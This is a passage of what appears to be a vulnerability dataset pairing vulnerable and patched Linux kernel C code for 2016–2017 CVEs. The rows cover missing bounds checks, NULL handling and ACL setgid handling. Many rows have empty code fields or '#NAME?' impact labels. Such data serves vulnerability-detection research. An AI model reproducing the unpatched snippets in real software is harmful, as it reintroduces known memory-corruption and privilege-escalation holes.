 return tcp_v4_do_rcv(sk, skb);

 if (tcp_filter(sk, skb))
 goto discard;

 /*
 if (tcp_v6_inbound_md5_hash(sk, skb))
 goto discard_and_relse;

 if (tcp_filter(sk, skb))
 goto discard_and_relse;
	th = (const struct tcphdr *)skb->data;
	hdr = ipv6_hdr(skb);

	skb->dev = NULL;

"
2017,DoS Overflow Mem. Corr. +Info ,CVE-2016-8636,"
 case RXE_MEM_TYPE_MR:
 case RXE_MEM_TYPE_FMR:
 return ((iova < mem->iova) ||
			((iova + length) > (mem->iova + mem->length))) ?
			-EFAULT : 0;



 default:
 return -EFAULT;
","
 case RXE_MEM_TYPE_MR:
 case RXE_MEM_TYPE_FMR:
 if (iova < mem->iova ||
		    length > mem->length ||
		    iova > mem->iova + mem->length - length)
 return -EFAULT;
 return 0;

 default:
 return -EFAULT;
"
2016,Exec Code Overflow ,CVE-2016-8633," int retval;
	u16 ether_type;




	hdr.w0 = be32_to_cpu(buf[0]);
	lf = fwnet_get_hdr_lf(&hdr);
 if (lf == RFC2374_HDR_UNFRAG) {
 return fwnet_finish_incoming_packet(net, skb, source_node_id,
						    is_broadcast, ether_type);
	}

 /* A datagram fragment has been received, now the fun begins. */




	hdr.w1 = ntohl(buf[1]);
	buf += 2;
	len -= RFC2374_FRAG_HDR_SIZE;
	datagram_label = fwnet_get_hdr_dgl(&hdr);
	dg_size = fwnet_get_hdr_dg_size(&hdr); /* ??? + 1 */




 spin_lock_irqsave(&dev->lock, flags);

	peer = fwnet_peer_find_by_node_id(dev, source_node_id, generation);
 fw_send_response(card, r, rcode);
}

















static void fwnet_receive_broadcast(struct fw_iso_context *context,
		u32 cycle, size_t header_length, void *header, void *data)
{
	__be32 *buf_ptr;
 int retval;
	u32 length;
	u16 source_node_id;
	u32 specifier_id;
	u32 ver;
 unsigned long offset;
 unsigned long flags;


 spin_unlock_irqrestore(&dev->lock, flags);

	specifier_id =    (be32_to_cpu(buf_ptr[0]) & 0xffff) << 8
			| (be32_to_cpu(buf_ptr[1]) & 0xff000000) >> 24;
	ver = be32_to_cpu(buf_ptr[1]) & 0xffffff;
	source_node_id = be32_to_cpu(buf_ptr[0]) >> 16;

 if (specifier_id == IANA_SPECIFIER_ID &&
	    (ver == RFC2734_SW_VERSION
#if IS_ENABLED(CONFIG_IPV6)
	     || ver == RFC3146_SW_VERSION
#endif
	    )) {
		buf_ptr += 2;
		length -= IEEE1394_GASP_HDR_SIZE;
 fwnet_incoming_packet(dev, buf_ptr, length, source_node_id,
				      context->card->generation, true);
	}

	packet.payload_length = dev->rcv_buffer_size;
	packet.interrupt = 1;
"," int retval;
	u16 ether_type;

 if (len <= RFC2374_UNFRAG_HDR_SIZE)
 return 0;

	hdr.w0 = be32_to_cpu(buf[0]);
	lf = fwnet_get_hdr_lf(&hdr);
 if (lf == RFC2374_HDR_UNFRAG) {
 return fwnet_finish_incoming_packet(net, skb, source_node_id,
						    is_broadcast, ether_type);
	}

 /* A datagram fragment has been received, now the fun begins. */

 if (len <= RFC2374_FRAG_HDR_SIZE)
 return 0;

	hdr.w1 = ntohl(buf[1]);
	buf += 2;
	len -= RFC2374_FRAG_HDR_SIZE;
	datagram_label = fwnet_get_hdr_dgl(&hdr);
	dg_size = fwnet_get_hdr_dg_size(&hdr); /* ??? + 1 */

 if (fg_off + len > dg_size)
 return 0;

 spin_lock_irqsave(&dev->lock, flags);

	peer = fwnet_peer_find_by_node_id(dev, source_node_id, generation);
 fw_send_response(card, r, rcode);
}

static int gasp_source_id(__be32 *p)
{
 return be32_to_cpu(p[0]) >> 16;
}

static u32 gasp_specifier_id(__be32 *p)
{
 return (be32_to_cpu(p[0]) & 0xffff) << 8 |
	       (be32_to_cpu(p[1]) & 0xff000000) >> 24;
}

static u32 gasp_version(__be32 *p)
{
 return be32_to_cpu(p[1]) & 0xffffff;
}

static void fwnet_receive_broadcast(struct fw_iso_context *context,
		u32 cycle, size_t header_length, void *header, void *data)
{
	__be32 *buf_ptr;
 int retval;
	u32 length;



 unsigned long offset;
 unsigned long flags;


 spin_unlock_irqrestore(&dev->lock, flags);

 if (length > IEEE1394_GASP_HDR_SIZE &&
 gasp_specifier_id(buf_ptr) == IANA_SPECIFIER_ID &&
	    (gasp_version(buf_ptr) == RFC2734_SW_VERSION




#if IS_ENABLED(CONFIG_IPV6)
	     || gasp_version(buf_ptr) == RFC3146_SW_VERSION
#endif
	    ))
 fwnet_incoming_packet(dev, buf_ptr + 2,
  length - IEEE1394_GASP_HDR_SIZE,
  gasp_source_id(buf_ptr),
				      context->card->generation, true);


	packet.payload_length = dev->rcv_buffer_size;
	packet.interrupt = 1;
"
2016,DoS Overflow +Priv ,CVE-2016-8632,,
2016,DoS ,CVE-2016-8630,"	/* Decode and fetch the destination operand: register or memory. */
	rc = decode_operand(ctxt, &ctxt->dst, (ctxt->d >> DstShift) & OpMask);

	if (ctxt->rip_relative)
		ctxt->memopp->addr.mem.ea = address_mask(ctxt,
					ctxt->memopp->addr.mem.ea + ctxt->_eip);

","	/* Decode and fetch the destination operand: register or memory. */
	rc = decode_operand(ctxt, &ctxt->dst, (ctxt->d >> DstShift) & OpMask);

	if (ctxt->rip_relative && likely(ctxt->memopp))
		ctxt->memopp->addr.mem.ea = address_mask(ctxt,
					ctxt->memopp->addr.mem.ea + ctxt->_eip);

"
2017,#NAME?,CVE-2016-8483,,
2017,Exec Code ,CVE-2016-8481,,
2017,Exec Code ,CVE-2016-8480,,
2017,Exec Code ,CVE-2016-8479,,
2017,#NAME?,CVE-2016-8478,,
2017,#NAME?,CVE-2016-8477,,
2017,Exec Code ,CVE-2016-8476,,
2017,#NAME?,CVE-2016-8475,,
2017,#NAME?,CVE-2016-8474,,
2017,#NAME?,CVE-2016-8473,,
2017,#NAME?,CVE-2016-8469,,
2017,Exec Code ,CVE-2016-8468,,
2017,Exec Code ,CVE-2016-8466,,
2017,Exec Code ,CVE-2016-8465,,
2017,Exec Code ,CVE-2016-8464,,
2017,DoS ,CVE-2016-8463,,
2017,#NAME?,CVE-2016-8461,,
2017,#NAME?,CVE-2016-8460,,
2017,Overflow ,CVE-2016-8459,,
2017,Exec Code ,CVE-2016-8458,,
2017,Exec Code ,CVE-2016-8457,,
2017,Exec Code ,CVE-2016-8456,,
2017,Exec Code ,CVE-2016-8455,,
2017,Exec Code ,CVE-2016-8454,,
2017,Exec Code ,CVE-2016-8453,,
2017,Exec Code ,CVE-2016-8452,,
2017,Exec Code ,CVE-2016-8451,,
2017,Exec Code ,CVE-2016-8450,,
2017,Exec Code ,CVE-2016-8449,,
2017,Exec Code ,CVE-2016-8444,,
2017,,CVE-2016-8443,,
2017,,CVE-2016-8442,,
2017,Overflow ,CVE-2016-8441,,
2017,Overflow ,CVE-2016-8440,,
2017,Overflow ,CVE-2016-8439,,
2017,Overflow Bypass ,CVE-2016-8438,,
2017,,CVE-2016-8437,,
2017,Exec Code ,CVE-2016-8436,,
2017,Exec Code ,CVE-2016-8435,,
2017,Exec Code ,CVE-2016-8434,,
2017,Exec Code ,CVE-2016-8432,,
2017,Exec Code ,CVE-2016-8431,,
2017,Exec Code ,CVE-2016-8430,,
2017,Exec Code ,CVE-2016-8429,,
2017,Exec Code ,CVE-2016-8428,,
2017,Exec Code ,CVE-2016-8427,,
2017,Exec Code ,CVE-2016-8426,,
2017,Exec Code ,CVE-2016-8425,,
2017,Exec Code ,CVE-2016-8424,,
2017,Exec Code ,CVE-2016-8421,,
2017,Exec Code ,CVE-2016-8420,,
2017,Exec Code ,CVE-2016-8419,,
2017,Exec Code ,CVE-2016-8417,,
2017,#NAME?,CVE-2016-8416,,
2017,Exec Code ,CVE-2016-8415,,
2017,#NAME?,CVE-2016-8414,,
2017,#NAME?,CVE-2016-8413,,
2017,Exec Code ,CVE-2016-8412,,
2017,#NAME?,CVE-2016-8410,,
2017,#NAME?,CVE-2016-8409,,
2017,#NAME?,CVE-2016-8408,,
2017,#NAME?,CVE-2016-8407,,
2017,#NAME?,CVE-2016-8406,,
2017,#NAME?,CVE-2016-8405,,
2017,#NAME?,CVE-2016-8404,,
2017,#NAME?,CVE-2016-8403,,
2017,#NAME?,CVE-2016-8402,,
2017,#NAME?,CVE-2016-8401,,
2017,#NAME?,CVE-2016-8400,,
2017,Exec Code ,CVE-2016-8399,,
2017,,CVE-2016-8398,,
2017,#NAME?,CVE-2016-8397,,
2017,DoS ,CVE-2016-8395,,
2017,Exec Code ,CVE-2016-8394,,
2017,Exec Code ,CVE-2016-8393,,
2017,Exec Code ,CVE-2016-8392,,
2017,Exec Code ,CVE-2016-8391,,
2016,DoS +Info ,CVE-2016-7917,"		nlh = nlmsg_hdr(skb);
		err = 0;

 if (nlmsg_len(nlh) < sizeof(struct nfgenmsg) ||
		    skb->len < nlh->nlmsg_len) {
			err = -EINVAL;
 goto ack;


		}

 /* Only requests are handled by the kernel */
","		nlh = nlmsg_hdr(skb);
		err = 0;

 if (nlh->nlmsg_len < NLMSG_HDRLEN ||
		    skb->len < nlh->nlmsg_len ||
 nlmsg_len(nlh) < sizeof(struct nfgenmsg)) {
 nfnl_err_reset(&err_list);
			status |= NFNL_BATCH_FAILURE;
 goto done;
		}

 /* Only requests are handled by the kernel */
"
2016,#NAME?,CVE-2016-7916," struct mm_struct *mm = file->private_data;
 unsigned long env_start, env_end;

 if (!mm)

 return 0;

	page = (char *)__get_free_page(GFP_TEMPORARY);
"," struct mm_struct *mm = file->private_data;
 unsigned long env_start, env_end;

 /* Ensure the process spawned far enough to have an environment. */
 if (!mm || !mm->env_end)
 return 0;

	page = (char *)__get_free_page(GFP_TEMPORARY);
"
2016,DoS +Info ,CVE-2016-7915," /* Ignore report if ErrorRollOver */
 if (!(field->flags & HID_MAIN_ITEM_VARIABLE) &&
		    value[n] >= min && value[n] <= max &&

		    field->usage[value[n] - min].hid == HID_UP_KEYBOARD + 1)
 goto exit;
	}
		}

 if (field->value[n] >= min && field->value[n] <= max

			&& field->usage[field->value[n] - min].hid
			&& search(value, field->value[n], count))
 hid_process_event(hid, field, &field->usage[field->value[n] - min], 0, interrupt);

 if (value[n] >= min && value[n] <= max

			&& field->usage[value[n] - min].hid
			&& search(field->value, value[n], count))
 hid_process_event(hid, field, &field->usage[value[n] - min], 1, interrupt);
"," /* Ignore report if ErrorRollOver */
 if (!(field->flags & HID_MAIN_ITEM_VARIABLE) &&
		    value[n] >= min && value[n] <= max &&
		    value[n] - min < field->maxusage &&
		    field->usage[value[n] - min].hid == HID_UP_KEYBOARD + 1)
 goto exit;
	}
		}

 if (field->value[n] >= min && field->value[n] <= max
			&& field->value[n] - min < field->maxusage
			&& field->usage[field->value[n] - min].hid
			&& search(value, field->value[n], count))
 hid_process_event(hid, field, &field->usage[field->value[n] - min], 0, interrupt);

 if (value[n] >= min && value[n] <= max
			&& value[n] - min < field->maxusage
			&& field->usage[value[n] - min].hid
			&& search(field->value, value[n], count))
 hid_process_event(hid, field, &field->usage[value[n] - min], 1, interrupt);
"
2016,DoS +Info ,CVE-2016-7914,"			free_slot = i;
 continue;
		}
 if (ops->compare_object(assoc_array_ptr_to_leaf(ptr), index_key)) {


 pr_devel(""replace in slot %d\n"", i);
			edit->leaf_p = &node->slots[i];
			edit->dead_leaf = node->slots[i];
","			free_slot = i;
 continue;
		}
 if (assoc_array_ptr_is_leaf(ptr) &&
		    ops->compare_object(assoc_array_ptr_to_leaf(ptr),
					index_key)) {
 pr_devel(""replace in slot %d\n"", i);
			edit->leaf_p = &node->slots[i];
			edit->dead_leaf = node->slots[i];
"
2016,DoS +Priv ,CVE-2016-7913,"	 * in order to avoid troubles during device release.
 */
 kfree(priv->ctrl.fname);

 memcpy(&priv->ctrl, p, sizeof(priv->ctrl));
 if (p->fname) {
		priv->ctrl.fname = kstrdup(p->fname, GFP_KERNEL);
 if (priv->ctrl.fname == NULL)
 rc = -ENOMEM;
	}

 /*
","	 * in order to avoid troubles during device release.
 */
 kfree(priv->ctrl.fname);
	priv->ctrl.fname = NULL;
 memcpy(&priv->ctrl, p, sizeof(priv->ctrl));
 if (p->fname) {
		priv->ctrl.fname = kstrdup(p->fname, GFP_KERNEL);
 if (priv->ctrl.fname == NULL)
 return -ENOMEM;
	}

 /*
"
2016,#NAME?,CVE-2016-7912,"						   work);
 int ret = io_data->req->status ? io_data->req->status :
					 io_data->req->actual;


 if (io_data->read && ret > 0) {
 use_mm(io_data->mm);

	io_data->kiocb->ki_complete(io_data->kiocb, ret, ret);

 if (io_data->ffs->ffs_eventfd &&
	    !(io_data->kiocb->ki_flags & IOCB_EVENTFD))
 eventfd_signal(io_data->ffs->ffs_eventfd, 1);

 usb_ep_free_request(io_data->ep, io_data->req);

	io_data->kiocb->private = NULL;
 if (io_data->read)
 kfree(io_data->to_free);
 kfree(io_data->buf);
","						   work);
 int ret = io_data->req->status ? io_data->req->status :
					 io_data->req->actual;
 bool kiocb_has_eventfd = io_data->kiocb->ki_flags & IOCB_EVENTFD;

 if (io_data->read && ret > 0) {
 use_mm(io_data->mm);

	io_data->kiocb->ki_complete(io_data->kiocb, ret, ret);

 if (io_data->ffs->ffs_eventfd && !kiocb_has_eventfd)

 eventfd_signal(io_data->ffs->ffs_eventfd, 1);

 usb_ep_free_request(io_data->ep, io_data->req);


 if (io_data->read)
 kfree(io_data->to_free);
 kfree(io_data->buf);
"
2016,DoS +Priv ,CVE-2016-7911," if (ret)
 goto out;
	ret = IOPRIO_PRIO_VALUE(IOPRIO_CLASS_NONE, IOPRIO_NORM);

 if (p->io_context)
		ret = p->io_context->ioprio;

out:
 return ret;
}
"," if (ret)
 goto out;
	ret = IOPRIO_PRIO_VALUE(IOPRIO_CLASS_NONE, IOPRIO_NORM);
 task_lock(p);
 if (p->io_context)
		ret = p->io_context->ioprio;
 task_unlock(p);
out:
 return ret;
}
"
2016,#NAME?,CVE-2016-7910," if (iter) {
 class_dev_iter_exit(iter);
 kfree(iter);

	}
}

"," if (iter) {
 class_dev_iter_exit(iter);
 kfree(iter);
		seqf->private = NULL;
	}
}

"
2016,DoS Overflow +Priv ,CVE-2016-7425,"	}
 case ARCMSR_MESSAGE_WRITE_WQBUFFER: {
 unsigned char *ver_addr;
 int32_t user_len, cnt2end;

 uint8_t *pQbuffer, *ptmpuserbuffer;
		ver_addr = kmalloc(ARCMSR_API_DATA_BUFLEN, GFP_ATOMIC);
 if (!ver_addr) {
		}
		ptmpuserbuffer = ver_addr;
		user_len = pcmdmessagefld->cmdmessage.Length;





 memcpy(ptmpuserbuffer,
			pcmdmessagefld->messagedatabuffer, user_len);
 spin_lock_irqsave(&acb->wqbuffer_lock, flags);
","	}
 case ARCMSR_MESSAGE_WRITE_WQBUFFER: {
 unsigned char *ver_addr;
 uint32_t user_len;
 int32_t cnt2end;
 uint8_t *pQbuffer, *ptmpuserbuffer;
		ver_addr = kmalloc(ARCMSR_API_DATA_BUFLEN, GFP_ATOMIC);
 if (!ver_addr) {
		}
		ptmpuserbuffer = ver_addr;
		user_len = pcmdmessagefld->cmdmessage.Length;
 if (user_len > ARCMSR_API_DATA_BUFLEN) {
			retvalue = ARCMSR_MESSAGE_FAIL;
 kfree(ver_addr);
 goto message_out;
		}
 memcpy(ptmpuserbuffer,
			pcmdmessagefld->messagedatabuffer, user_len);
 spin_lock_irqsave(&acb->wqbuffer_lock, flags);
"
2016,Exec Code ,CVE-2016-7117," cond_resched();
	}

out_put:
 fput_light(sock->file, fput_needed);

 if (err == 0)
 return datagrams;

 if (datagrams != 0) {









 /*
		 * We may return less entries than requested (vlen) if the
		 * sock is non block and there aren't enough datagrams...


 */
 if (err != -EAGAIN) {
 /*
			 * ... or  if recvmsg returns an error after we
			 * received some datagrams, where we record the
			 * error to return on the next call or if the
			 * app asks about it using getsockopt(SO_ERROR).
 */
			sock->sk->sk_err = -err;
		}

 return datagrams;
	}



 return err;
}

SYSCALL_DEFINE5(recvmmsg, int, fd, struct mmsghdr __user *, mmsg,
"," cond_resched();
	}




 if (err == 0)
 goto out_put;

 if (datagrams == 0) {
		datagrams = err;
 goto out_put;
	}

 /*
	 * We may return less entries than requested (vlen) if the
	 * sock is non block and there aren't enough datagrams...
 */
 if (err != -EAGAIN) {
 /*
		 * ... or  if recvmsg returns an error after we
		 * received some datagrams, where we record the
		 * error to return on the next call or if the
		 * app asks about it using getsockopt(SO_ERROR).
 */
		sock->sk->sk_err = -err;










	}
out_put:
 fput_light(sock->file, fput_needed);

 return datagrams;
}

SYSCALL_DEFINE5(recvmmsg, int, fd, struct mmsghdr __user *, mmsg,
"
2016,#NAME?,CVE-2016-7097," switch (handler->flags) {
 case ACL_TYPE_ACCESS:
 if (acl) {
 umode_t mode = inode->i_mode;
			retval = posix_acl_equiv_mode(acl, &mode);
 if (retval < 0)

 goto err_out;
 else {
 struct iattr iattr;
 if (retval == 0) {
 /*
					 * ACL can be represented
					 * by the mode bits. So don't
					 * update ACL.
 */
					acl = NULL;
					value = NULL;
					size = 0;
				}
 /* Updte the mode bits */
				iattr.ia_mode = ((mode & S_IALLUGO) |
						 (inode->i_mode & ~S_IALLUGO));
				iattr.ia_valid = ATTR_MODE;
 /* FIXME should we update ctime ?
				 * What is the following setxattr update the
				 * mode ?
 */
 v9fs_vfs_setattr_dotl(dentry, &iattr);

			}






		}
 break;
 case ACL_TYPE_DEFAULT:
 case ACL_TYPE_ACCESS:
		name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
			ret = posix_acl_equiv_mode(acl, &inode->i_mode);
 if (ret < 0)
 return ret;
 if (ret == 0)
				acl = NULL;
		}
		ret = 0;
 break;
 case ACL_TYPE_ACCESS:
		name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
			ret = posix_acl_equiv_mode(acl, &new_mode);
 if (ret < 0)
 goto out;
 if (ret == 0)
				acl = NULL;
		}
 break;
 case ACL_TYPE_DEFAULT:
 case ACL_TYPE_ACCESS:
			name_index = EXT2_XATTR_INDEX_POSIX_ACL_ACCESS;
 if (acl) {
				error = posix_acl_equiv_mode(acl, &inode->i_mode);
 if (error < 0)
 return error;
 else {
					inode->i_ctime = CURRENT_TIME_SEC;
 mark_inode_dirty(inode);
 if (error == 0)
						acl = NULL;
				}
			}
 break;

 case ACL_TYPE_ACCESS:
		name_index = EXT4_XATTR_INDEX_POSIX_ACL_ACCESS;
 if (acl) {
			error = posix_acl_equiv_mode(acl, &inode->i_mode);
 if (error < 0)
 return error;
 else {
				inode->i_ctime = ext4_current_time(inode);
 ext4_mark_inode_dirty(handle, inode);
 if (error == 0)
					acl = NULL;
			}
		}
 break;

 case ACL_TYPE_ACCESS:
		name_index = F2FS_XATTR_INDEX_POSIX_ACL_ACCESS;
 if (acl) {
			error = posix_acl_equiv_mode(acl, &inode->i_mode);
 if (error < 0)
 return error;
 set_acl_inode(inode, inode->i_mode);
 if (error == 0)
				acl = NULL;
		}
 break;

 if (type == ACL_TYPE_ACCESS) {
 umode_t mode = inode->i_mode;

		error = posix_acl_equiv_mode(acl, &mode);
 if (error < 0)
 return error;

 if (error == 0)
			acl = NULL;

 if (mode != inode->i_mode) {
			inode->i_mode = mode;
 mark_inode_dirty(inode);
		}
	}

 if (acl) {
 case ACL_TYPE_ACCESS:
		xattr_name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
			err = posix_acl_equiv_mode(acl, &inode->i_mode);
 if (err < 0)
 return err;
		}
		err = 0;
 case ACL_TYPE_ACCESS:
		xprefix = JFFS2_XPREFIX_ACL_ACCESS;
 if (acl) {
 umode_t mode = inode->i_mode;
			rc = posix_acl_equiv_mode(acl, &mode);
 if (rc < 0)

 return rc;
 if (inode->i_mode != mode) {
 struct iattr attr;
 if (rc < 0)
 return rc;
			}
 if (rc == 0)
				acl = NULL;
		}
 break;
 case ACL_TYPE_DEFAULT:
 case ACL_TYPE_ACCESS:
		ea_name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
			rc = posix_acl_equiv_mode(acl, &inode->i_mode);
 if (rc < 0)
 return rc;
			inode->i_ctime = CURRENT_TIME;
 mark_inode_dirty(inode);
 if (rc == 0)
				acl = NULL;
		}
 break;
 case ACL_TYPE_DEFAULT:
 case ACL_TYPE_ACCESS:
		name_index = OCFS2_XATTR_INDEX_POSIX_ACL_ACCESS;
 if (acl) {
 umode_t mode = inode->i_mode;
			ret = posix_acl_equiv_mode(acl, &mode);
 if (ret < 0)
 return ret;

 if (ret == 0)
				acl = NULL;


			ret = ocfs2_acl_set_mode(inode, di_bh,
						 handle, mode);
 case ACL_TYPE_ACCESS:
		name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
 umode_t mode = inode->i_mode;
 /*
			 * can we represent this with the traditional file
			 * mode permission bits?
 */
			error = posix_acl_equiv_mode(acl, &mode);
 if (error < 0) {
 gossip_err(""%s: posix_acl_equiv_mode err: %d\n"",
					   __func__,
					   error);
 return error;
 SetModeFlag(orangefs_inode);
			inode->i_mode = mode;
 mark_inode_dirty_sync(inode);
 if (error == 0)
				acl = NULL;
		}
 break;
 case ACL_TYPE_DEFAULT:
}
EXPORT_SYMBOL_GPL(posix_acl_create);
































/*
 * Fix up the uids and gids in posix acl extended attributes in place.
 */
 case ACL_TYPE_ACCESS:
		name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
			error = posix_acl_equiv_mode(acl, &inode->i_mode);
 if (error < 0)
 return error;
 else {
 if (error == 0)
					acl = NULL;
			}
		}
 break;
 case ACL_TYPE_DEFAULT:
 return error;

 if (type == ACL_TYPE_ACCESS) {
 umode_t mode = inode->i_mode;
		error = posix_acl_equiv_mode(acl, &mode);

 if (error <= 0) {
			acl = NULL;

 if (error < 0)
 return error;
		}




		error = xfs_set_mode(inode, mode);
 if (error)
 return error;
extern int posix_acl_chmod(struct inode *, umode_t);
extern int posix_acl_create(struct inode *, umode_t *, struct posix_acl **,
 struct posix_acl **);


extern int simple_set_acl(struct inode *, struct posix_acl *, int);
extern int simple_acl_create(struct inode *, struct inode *);
"," switch (handler->flags) {
 case ACL_TYPE_ACCESS:
 if (acl) {
 struct iattr iattr;

			retval = posix_acl_update_mode(inode, &iattr.ia_mode, &acl);
 if (retval)
 goto err_out;
 if (!acl) {
 /*
				 * ACL can be represented
				 * by the mode bits. So don't
				 * update ACL.














 */
				value = NULL;
				size = 0;
			}
			iattr.ia_valid = ATTR_MODE;
 /* FIXME should we update ctime ?
			 * What is the following setxattr update the
			 * mode ?
 */
 v9fs_vfs_setattr_dotl(dentry, &iattr);
		}
 break;
 case ACL_TYPE_DEFAULT:
 case ACL_TYPE_ACCESS:
		name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
			ret = posix_acl_update_mode(inode, &inode->i_mode, &acl);
 if (ret)
 return ret;


		}
		ret = 0;
 break;
 case ACL_TYPE_ACCESS:
		name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
			ret = posix_acl_update_mode(inode, &new_mode, &acl);
 if (ret)
 goto out;


		}
 break;
 case ACL_TYPE_DEFAULT:
 case ACL_TYPE_ACCESS:
			name_index = EXT2_XATTR_INDEX_POSIX_ACL_ACCESS;
 if (acl) {
				error = posix_acl_update_mode(inode, &inode->i_mode, &acl);
 if (error)
 return error;
				inode->i_ctime = CURRENT_TIME_SEC;
 mark_inode_dirty(inode);




			}
 break;

 case ACL_TYPE_ACCESS:
		name_index = EXT4_XATTR_INDEX_POSIX_ACL_ACCESS;
 if (acl) {
			error = posix_acl_update_mode(inode, &inode->i_mode, &acl);
 if (error)
 return error;
			inode->i_ctime = ext4_current_time(inode);
 ext4_mark_inode_dirty(handle, inode);




		}
 break;

 case ACL_TYPE_ACCESS:
		name_index = F2FS_XATTR_INDEX_POSIX_ACL_ACCESS;
 if (acl) {
			error = posix_acl_update_mode(inode, &inode->i_mode, &acl);
 if (error)
 return error;
 set_acl_inode(inode, inode->i_mode);


		}
 break;

 if (type == ACL_TYPE_ACCESS) {
 umode_t mode = inode->i_mode;

		error = posix_acl_update_mode(inode, &inode->i_mode, &acl);
 if (error)
 return error;
 if (mode != inode->i_mode)





 mark_inode_dirty(inode);

	}

 if (acl) {
 case ACL_TYPE_ACCESS:
		xattr_name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
			err = posix_acl_update_mode(inode, &inode->i_mode, &acl);
 if (err)
 return err;
		}
		err = 0;
 case ACL_TYPE_ACCESS:
		xprefix = JFFS2_XPREFIX_ACL_ACCESS;
 if (acl) {
 umode_t mode;

			rc = posix_acl_update_mode(inode, &mode, &acl);
 if (rc)
 return rc;
 if (inode->i_mode != mode) {
 struct iattr attr;
 if (rc < 0)
 return rc;
			}


		}
 break;
 case ACL_TYPE_DEFAULT:
 case ACL_TYPE_ACCESS:
		ea_name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
			rc = posix_acl_update_mode(inode, &inode->i_mode, &acl);
 if (rc)
 return rc;
			inode->i_ctime = CURRENT_TIME;
 mark_inode_dirty(inode);


		}
 break;
 case ACL_TYPE_DEFAULT:
 case ACL_TYPE_ACCESS:
		name_index = OCFS2_XATTR_INDEX_POSIX_ACL_ACCESS;
 if (acl) {
 umode_t mode;




			ret = posix_acl_update_mode(inode, &mode, &acl);
 if (ret)
 return ret;

			ret = ocfs2_acl_set_mode(inode, di_bh,
						 handle, mode);
 case ACL_TYPE_ACCESS:
		name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
 umode_t mode;

			error = posix_acl_update_mode(inode, &mode, &acl);
 if (error) {
 gossip_err(""%s: posix_acl_update_mode err: %d\n"",



					   __func__,
					   error);
 return error;
 SetModeFlag(orangefs_inode);
			inode->i_mode = mode;
 mark_inode_dirty_sync(inode);


		}
 break;
 case ACL_TYPE_DEFAULT:
}
EXPORT_SYMBOL_GPL(posix_acl_create);

/**
 * posix_acl_update_mode  -  update mode in set_acl
 *
 * Update the file mode when setting an ACL: compute the new file permission
 * bits based on the ACL.  In addition, if the ACL is equivalent to the new
 * file mode, set *acl to NULL to indicate that no ACL should be set.
 *
 * As with chmod, clear the setgit bit if the caller is not in the owning group
 * or capable of CAP_FSETID (see inode_change_ok).
 *
 * Called from set_acl inode operations.
 */
int posix_acl_update_mode(struct inode *inode, umode_t *mode_p,
 struct posix_acl **acl)
{
 umode_t mode = inode->i_mode;
 int error;

	error = posix_acl_equiv_mode(*acl, &mode);
 if (error < 0)
 return error;
 if (error == 0)
		*acl = NULL;
 if (!in_group_p(inode->i_gid) &&
	    !capable_wrt_inode_uidgid(inode, CAP_FSETID))
		mode &= ~S_ISGID;
	*mode_p = mode;
 return 0;
}
EXPORT_SYMBOL(posix_acl_update_mode);

/*
 * Fix up the uids and gids in posix acl extended attributes in place.
 */
 case ACL_TYPE_ACCESS:
		name = XATTR_NAME_POSIX_ACL_ACCESS;
 if (acl) {
			error = posix_acl_update_mode(inode, &inode->i_mode, &acl);
 if (error)
 return error;




		}
 break;
 case ACL_TYPE_DEFAULT:
 return error;

 if (type == ACL_TYPE_ACCESS) {
 umode_t mode;









		error = posix_acl_update_mode(inode, &mode, &acl);
 if (error)
 return error;
		error = xfs_set_mode(inode, mode);
 if (error)
 return error;
extern int posix_acl_chmod(struct inode *, umode_t);
extern int posix_acl_create(struct inode *, umode_t *, struct posix_acl **,
 struct posix_acl **);
extern int posix_acl_update_mode(struct inode *, umode_t *, struct posix_acl **);

extern int simple_set_acl(struct inode *, struct posix_acl *, int);
extern int simple_acl_create(struct inode *, struct inode *);
"
2016,DoS Overflow Mem. Corr. ,CVE-2016-7042,,
2016,DoS ,CVE-2016-7039,,
2016,DoS ,CVE-2016-6828,"{
 if (sk->sk_send_head == skb_unlinked)
		sk->sk_send_head = NULL;


}

static inline void tcp_init_send_head(struct sock *sk)
","{
 if (sk->sk_send_head == skb_unlinked)
		sk->sk_send_head = NULL;
 if (tcp_sk(sk)->highest_sack == skb_unlinked)
 tcp_sk(sk)->highest_sack = NULL;
}

static inline void tcp_init_send_head(struct sock *sk)
"
2017,Exec Code ,CVE-2016-6791,,
2017,Exec Code +Priv ,CVE-2016-6790,,
2017,Exec Code +Priv ,CVE-2016-6789,,
2016,#NAME?,CVE-2016-6787,,
2016,#NAME?,CVE-2016-6786,,
2017,Exec Code ,CVE-2016-6785,,
2017,Exec Code ,CVE-2016-6782,,
2017,Exec Code ,CVE-2016-6781,,
2017,Exec Code ,CVE-2016-6780,,
2017,Exec Code ,CVE-2016-6779,,
2017,Exec Code ,CVE-2016-6778,,
2017,Exec Code ,CVE-2016-6777,,
2017,Exec Code ,CVE-2016-6776,,
2017,Exec Code ,CVE-2016-6775,,
2017,Exec Code +Priv ,CVE-2016-6761,,
2017,Exec Code +Priv ,CVE-2016-6760,,
2017,Exec Code +Priv ,CVE-2016-6759,,
2017,Exec Code +Priv ,CVE-2016-6758,,
2017,#NAME?,CVE-2016-6757,,
2017,#NAME?,CVE-2016-6756,,
2017,Exec Code ,CVE-2016-6755,,
2016,DoS Overflow +Priv ,CVE-2016-6516," goto out;
	}


	ret = vfs_dedupe_file_range(file, same);
 if (ret)
 goto out;
"," goto out;
	}

	same->dest_count = count;
	ret = vfs_dedupe_file_range(file, same);
 if (ret)
 goto out;
"
2016,DoS ,CVE-2016-6480,,
2016,DoS ,CVE-2016-6327," return -1;
}

/**
 * srpt_rx_mgmt_fn_tag() - Process a task management function by tag.
 * @ch: RDMA channel of the task management request.
 * @fn: Task management function to perform.
 * @req_tag: Tag of the SRP task management request.
 * @mgmt_ioctx: I/O context of the task management request.
 *
 * Returns zero if the target core will process the task management
 * request asynchronously.
 *
 * Note: It is assumed that the initiator serializes tag-based task management
 * requests.
 */
static int srpt_rx_mgmt_fn_tag(struct srpt_send_ioctx *ioctx, u64 tag)
{
